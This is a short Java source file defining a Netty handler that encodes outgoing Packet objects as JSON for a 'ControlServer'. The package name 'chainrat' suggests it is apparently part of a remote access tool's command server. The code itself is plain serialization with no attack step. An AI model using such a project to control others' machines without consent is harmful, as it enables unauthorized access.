package com.nefi.chainrat.server.network.ControlServer.CommandHandler;


import com.google.common.base.Charsets;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelOutboundHandlerAdapter;
import io.netty.channel.ChannelPromise;

public class JsonEncoderHandler extends ChannelOutboundHandlerAdapter {


    @Override
    public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {
        Packet packet = (Packet) msg;

        GsonBuilder gsonBuilder = new GsonBuilder();
        Gson gson = gsonBuilder.create();

        String sPacket = gson.toJson(packet, Packet.class);

        ByteBuf bytes = ctx.alloc().buffer(sPacket.length());
        bytes.writeCharSequence(sPacket, Charsets.UTF_8);
        ctx.write(bytes, promise);
    }
}
